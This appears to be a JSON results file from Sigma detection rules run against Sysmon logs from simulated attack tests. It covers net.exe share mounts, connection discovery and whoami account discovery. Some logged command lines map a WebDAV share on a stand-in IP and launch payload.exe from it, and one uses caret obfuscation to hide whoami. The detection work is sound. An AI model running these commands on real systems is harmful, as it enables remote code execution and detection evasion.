{
  "title": "Windows Share Mount Via Net.EXE",
  "id": "f117933c-980c-4f78-b384-e3d838111165",
  "description": "Detects when a share is mounted using the \"net.exe\" utility",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\net.exe' ESCAPE '\\' OR Image LIKE '%\\\\net1.exe' ESCAPE '\\') OR (OriginalFileName='net.exe' OR OriginalFileName='net1.exe')) AND (CommandLine LIKE '% use %' ESCAPE '\\' OR CommandLine LIKE '% \\\\\\\\%' ESCAPE '\\')))"
  ],
  "rule_level": "low",
  "tags": [
    "attack.lateral-movement",
    "attack.t1021.002"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 136,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  use https://192.0.2.1/share ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 203874,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1059.001__t1059.001_034.evtx",
      "ParentCommandLine": "cmd.exe /c \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D50C-6A2E-7F06-000000002C00",
      "ParentProcessId": 4136,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D50C-6A2E-8006-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T16:21:32.910287Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:21:32.902",
      "Version": 5
    },
    {
      "row_id": 138,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  use https://192.0.2.1/share ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 203924,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1059.001__t1059.001_035.evtx",
      "ParentCommandLine": "cmd.exe /C \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D53C-6A2E-9806-000000002C00",
      "ParentProcessId": 5888,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D53C-6A2E-9906-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T16:22:20.182267Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:22:20.173",
      "Version": 5
    }
  ]
},
{
  "title": "System Network Connections Discovery Via Net.EXE",
  "id": "1c67a717-32ba-409b-a45d-0fb704a73a81",
  "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\net.exe' ESCAPE '\\' OR Image LIKE '%\\\\net1.exe' ESCAPE '\\') OR (OriginalFileName='net.exe' OR OriginalFileName='net1.exe')) AND ((CommandLine LIKE '% use' ESCAPE '\\' OR CommandLine LIKE '% sessions' ESCAPE '\\') OR (CommandLine LIKE '% use %' ESCAPE '\\' OR CommandLine LIKE '% sessions %' ESCAPE '\\'))))"
  ],
  "rule_level": "low",
  "tags": [
    "attack.discovery",
    "attack.t1049"
  ],
  "count": 2,
  "matches": [
    {
      "row_id": 136,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  use https://192.0.2.1/share ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 203874,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1059.001__t1059.001_034.evtx",
      "ParentCommandLine": "cmd.exe /c \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D50C-6A2E-7F06-000000002C00",
      "ParentProcessId": 4136,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D50C-6A2E-8006-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T16:21:32.910287Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:21:32.902",
      "Version": 5
    },
    {
      "row_id": 138,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "net  use https://192.0.2.1/share ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "Net Command",
      "EventID": 1,
      "EventRecordID": 203924,
      "FileVersion": "10.0.26100.7019 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=8A1E71312BD2AAE202652113049CDBD1,SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75",
      "IMPHASH": "EF46B86C2346DA0A991DE4B78AAF4E75",
      "Image": "C:\\Windows\\System32\\net.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "8A1E71312BD2AAE202652113049CDBD1",
      "Opcode": 0,
      "OriginalFileName": "net.exe",
      "OriginalLogfile": "t1059.001__t1059.001_035.evtx",
      "ParentCommandLine": "cmd.exe /C \" net use https://192.0.2.1/share & start \\\\192.0.2.1\\DavWWWRoot\\payload.exe \"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D53C-6A2E-9806-000000002C00",
      "ParentProcessId": 5888,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D53C-6A2E-9906-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777",
      "SystemTime": "2026-06-14T16:22:20.182267Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:22:20.173",
      "Version": 5
    }
  ]
},
{
  "title": "Local Accounts Discovery",
  "id": "502b42de-4306-40b4-9596-6f590c81f073",
  "description": "Local accounts, System Owner/User discovery using operating systems utilities",
  "sigmafile": "",
  "sigma": [
    "SELECT * FROM logs WHERE Channel='Microsoft-Windows-Sysmon/Operational' AND (EventID=1 AND (((Image LIKE '%\\\\cmd.exe' ESCAPE '\\' AND (CommandLine LIKE '% /c%' ESCAPE '\\' AND CommandLine LIKE '%dir %' ESCAPE '\\' AND CommandLine LIKE '%\\\\Users\\\\%' ESCAPE '\\')) AND (NOT CommandLine LIKE '% rmdir %' ESCAPE '\\')) OR (((Image LIKE '%\\\\net.exe' ESCAPE '\\' OR Image LIKE '%\\\\net1.exe' ESCAPE '\\') AND CommandLine LIKE '%user%' ESCAPE '\\') AND (NOT (CommandLine LIKE '%/domain%' ESCAPE '\\' OR CommandLine LIKE '%/add%' ESCAPE '\\' OR CommandLine LIKE '%/delete%' ESCAPE '\\' OR CommandLine LIKE '%/active%' ESCAPE '\\' OR CommandLine LIKE '%/expires%' ESCAPE '\\' OR CommandLine LIKE '%/passwordreq%' ESCAPE '\\' OR CommandLine LIKE '%/scriptpath%' ESCAPE '\\' OR CommandLine LIKE '%/times%' ESCAPE '\\' OR CommandLine LIKE '%/workstations%' ESCAPE '\\'))) OR ((Image LIKE '%\\\\whoami.exe' ESCAPE '\\' OR Image LIKE '%\\\\quser.exe' ESCAPE '\\' OR Image LIKE '%\\\\qwinsta.exe' ESCAPE '\\') OR (Image LIKE '%\\\\wmic.exe' ESCAPE '\\' AND (CommandLine LIKE '%useraccount%' ESCAPE '\\' AND CommandLine LIKE '%get%' ESCAPE '\\')) OR (Image LIKE '%\\\\cmdkey.exe' ESCAPE '\\' AND CommandLine LIKE '% /l%' ESCAPE '\\'))))"
  ],
  "rule_level": "low",
  "tags": [
    "attack.discovery",
    "attack.t1033",
    "attack.t1087.001"
  ],
  "count": 7,
  "matches": [
    {
      "row_id": 36,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami  ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 213172,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1018__t1018_005.evtx",
      "ParentCommandLine": "cmd.exe /c \"whoami & echo [E]\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-EF1A-6A2E-AB18-000000002C00",
      "ParentProcessId": 11752,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-EF1A-6A2E-AC18-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T18:12:42.988446Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:12:42.942",
      "Version": 5
    },
    {
      "row_id": 50,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami  ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 213585,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1018__t1018_033.evtx",
      "ParentCommandLine": "cmd.exe /c \"whoami & echo [E]\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F029-6A2E-7919-000000002C00",
      "ParentProcessId": 6668,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F029-6A2E-7A19-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T18:17:13.181723Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:17:13.177",
      "Version": 5
    },
    {
      "row_id": 63,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami  ",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 214182,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1018__t1018_079.evtx",
      "ParentCommandLine": "cmd.exe /c \"whoami & echo [E]\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F1EA-6A2E-A41A-000000002C00",
      "ParentProcessId": 5876,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F1EA-6A2E-A51A-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T18:24:42.737279Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:24:42.733",
      "Version": 5
    },
    {
      "row_id": 73,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami.exe",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 214443,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1018__t1018_104.evtx",
      "ParentCommandLine": "C:\\WINDOWS\\system32\\cmd.exe /c whoami.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F2B6-6A2E-1D1B-000000002C00",
      "ParentProcessId": 5208,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F2B6-6A2E-1E1B-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T18:28:06.380293Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:28:06.374",
      "Version": 5
    },
    {
      "row_id": 76,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami.exe",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 214461,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1018__t1018_105.evtx",
      "ParentCommandLine": "C:\\WINDOWS\\system32\\cmd.exe /c whoami.exe",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-F2C8-6A2E-261B-000000002C00",
      "ParentProcessId": 8144,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-F2C8-6A2E-271B-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T18:28:24.644734Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 18:28:24.641",
      "Version": 5
    },
    {
      "row_id": 192,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 207565,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1059.001__t1059.001_486.evtx",
      "ParentCommandLine": "cmd.exe /c \"w^h^o^a^m^i\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E15B-6A2E-BC0D-000000002C00",
      "ParentProcessId": 12108,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E15B-6A2E-BD0D-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T17:14:03.616541Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:14:03.608",
      "Version": 5
    },
    {
      "row_id": 194,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "whoami",
      "Company": "Microsoft Corporation",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "whoami - displays logged on user information",
      "EventID": 1,
      "EventRecordID": 207612,
      "FileVersion": "10.0.26100.1882 (WinBuild.160101.0800)",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED",
      "IMPHASH": "E4464BCD92DF7AC69CCD074CB9C0EFED",
      "Image": "C:\\Windows\\System32\\whoami.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "956692DADC5B2CEB46E9219F7A5BEFFA",
      "Opcode": 0,
      "OriginalFileName": "whoami.exe",
      "OriginalLogfile": "t1059.001__t1059.001_487.evtx",
      "ParentCommandLine": "cmd.exe /C \"w^h^o^a^m^i\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E16F-6A2E-D40D-000000002C00",
      "ParentProcessId": 2028,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E16F-6A2E-D50D-000000002C00",
      "ProcessID": "3836",
      "Product": "Microsoft® Windows® Operating System",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3",
      "SystemTime": "2026-06-14T17:14:23.352436Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:14:23.348",
      "Version": 5
    }
  ]
}]